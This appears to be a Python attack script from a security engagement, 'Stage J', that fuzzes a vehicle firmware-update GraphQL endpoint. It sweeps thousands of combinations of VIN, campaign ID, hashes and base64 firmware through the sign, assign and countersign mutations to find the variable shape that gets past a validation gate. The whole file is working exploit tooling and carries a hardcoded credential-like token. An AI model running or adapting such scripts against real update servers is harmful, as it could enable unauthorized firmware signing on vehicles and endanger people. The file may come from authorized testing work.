#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Stage J: hunt the exact variables shape that clears the
"update campaign validation failed" gate on *_FirmwareUpdate.

Facts so far:
  query must contain one of  signFirmwareUpdate / assignFirmwareUpdate /
  countersignFirmwareUpdate  (all other names fall back to the guest payload).
  variables {} -> "vehicle campaign not found"
  variables {vin: CV622697F82A936A1} -> "update campaign validation failed"
  any other VIN -> "vehicle campaign not found"
  1701 single-key probes, ~25 auth headers: message never changes.

So the gate needs a specific COMBINATION (or a nested shape).  This script
sweeps shapes: nested objects, type variants, and campaign/update structures.
"""
import base64, hashlib, itertools, json, os
import requests
from concurrent.futures import ThreadPoolExecutor

HERE = os.path.dirname(os.path.abspath(__file__))
EV = os.path.abspath(os.path.join(HERE, "..", "..", "03_EVIDENCE", "sign"))
URL = "http://10.225.139.2:8080/graphql"
VIN = "CV622697F82A936A1"
CAMP = "CAMP-243892C376D4CB2D5F826953"
CRED = "5e7f07b4a81153ecd5868cc02557f823"
PKG = "3ac02bb40567fa14062cc768e22fefac3dd972aee87a3bf2d01419f026d573d0"
FW = open(os.path.join(HERE, "..", "..", "work", "bundle2", "x", "vcu-reference.bin"), "rb").read()
SHA = hashlib.sha256(FW).hexdigest()
B64 = base64.b64encode(FW).decode()
OPS = ["signFirmwareUpdate", "assignFirmwareUpdate", "countersignFirmwareUpdate"]
BASE = {"vin": VIN}
REF = '{"errors":[{"message":"update campaign validation failed"}]}'


def post(q, v):
    r = requests.post(URL, json={"query": q, "variables": v}, timeout=12)
    return r.status_code, r.text.strip()


# ---- candidate inner payloads -------------------------------------------------
INNERS = []
core = {"vin": VIN, "campaignId": CAMP, "rollback": 2, "sha256": SHA, "size": 1024,
        "address": "0x08040000", "firmware": B64}
for r_ in (1, 2, 3, 4, 5, 6, 7):
    for c in itertools.islice(itertools.combinations(core.items(), r_), 0, 60):
        INNERS.append(dict(c))
for r_ in (2, 3, 4):
    for c in itertools.islice(itertools.combinations(core.items(), r_), 0, 40):
        d = dict(c)
        INNERS.append(dict(d))
# type variants
INNERS.append({"vin": VIN, "rollback": "2", "campaignId": CAMP, "sha256": SHA, "size": "1024"})
INNERS.append({"vin": VIN, "rollback": 2.0, "campaignId": CAMP})
INNERS.append({"vin": VIN, "rollback": True, "campaignId": CAMP})
INNERS.append({"vin": [VIN], "campaignId": [CAMP], "rollback": [2]})
len(INNERS)
# nested wrappers
SHAPES = []
for inner in INNERS:
    for wrapper in ("input", "update", "request", "payload", "data", "firmware", "campaign",
                    "firmwareUpdate", "updateRequest", "args", "params"):
        SHAPES.append({**BASE, wrapper: inner})
        SHAPES.append({wrapper: {**inner, "vin": VIN}})
    SHAPES.append({**BASE, **inner})
    SHAPES.append({**inner})

print(f"[*] {len(SHAPES)} shapes x {len(OPS)} ops = {len(SHAPES) * len(OPS)} requests")

jobs = [(op, sh) for op in OPS for sh in SHAPES]


def run(j):
    op, sh = j
    try:
        st, txt = post(op, sh)
        return (op, json.dumps(sh, sort_keys=True, default=str)[:300], st, txt)
    except Exception as e:
        return (op, "?", -1, f"ERR {type(e).__name__}")


def main():
    res = []
    with ThreadPoolExecutor(max_workers=20) as ex:
        for r in ex.map(run, jobs):
            res.append(r)
    distinct = {}
    for op, sh, st, txt in res:
        distinct.setdefault(txt, []).append((op, sh))
    print(f"[*] distinct responses: {len(distinct)}")
    for msg, lst in distinct.items():
        print(f"  [{len(lst):5d}] {msg[:130]}")
        for op, sh in lst[:3]:
            print(f"          {op} {sh[:150]}")
    json.dump([{"op": o, "vars": s, "status": st, "resp": t} for o, s, st, t in res],
              open(os.path.join(EV, "J_shapes.json"), "w"), indent=1)


if __name__ == "__main__":
    main()
